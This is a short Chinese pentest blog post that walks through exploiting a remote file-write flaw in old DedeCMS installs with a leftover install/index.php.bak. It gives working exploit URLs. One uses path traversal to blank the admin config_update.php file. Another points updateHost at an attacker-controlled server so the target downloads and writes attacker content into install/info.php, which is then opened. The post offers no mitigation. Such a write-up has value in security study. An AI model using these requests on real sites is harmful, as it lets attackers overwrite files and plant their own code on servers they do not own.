+++
date = "2016-08-05T23:29:20+08:00"
description = ""
draft = false
tags = ["dedecms"]
title = "Dedecms远程写文件漏洞"
topics = ["Pentest"]

+++

### 0x00 关于漏洞
> ```
Dedecms在20150618之前的版本都存在远程写文件漏洞，主要起因是Apache的解析漏洞
```

### 0x01 利用条件
> ```
dedecms版本为20150618之前的  
安装目录install下的index.php.bak文件未被删除
```

### 0x02 实例
* 查看cms版本
{{% fluid_img src="/img/post/dedecms_before_20150617_check_version.png" alt="查看织梦cms版本" %}}

* 清空文件

> ```php
http://www.xxxx.com/install/index.php.bak?step=11&insLockfile=a
&s_lang=a&install_demo_name=../data/admin/config_update.php
访问上面的链接会使服务器到http://updatenew.dedecms.com/base-v57/dedecms/
demodata.a.txt中读取内容写入到config_update.php，但demodata.a.txt为空，
所以就清空了config_update.php
```
{{% fluid_img src="/img/post/dedecms_before_20150617_clear_config_update.png" alt="清空文件config_update" %}}

* 在自己的服务器上创建文件
{{% fluid_img src="/img/post/dedecms_before_20150617_construction_file.png" alt="在自己的服务器上构造文件" %}}

* 写入文件

> ```
访问http://www.xxxx.com/install/index.php.bak?step=11&insLockfile=a
&s_lang=a&install_demo_name=info.php&updateHost=http://123.123.123.123/
将自己的网站的dedecoms/demodata.a.txt写入到目标站点的install/下的info.php中
```
{{% fluid_img src="/img/post/dedecms_before_20150617_write_file.png" alt="将自己构造的内容写入到文件" %}}

* 访问生成的文件
{{% fluid_img src="/img/post/dedecms_before_20150617_visit_written_file.png" alt="访问写入我们内容的文件" %}}
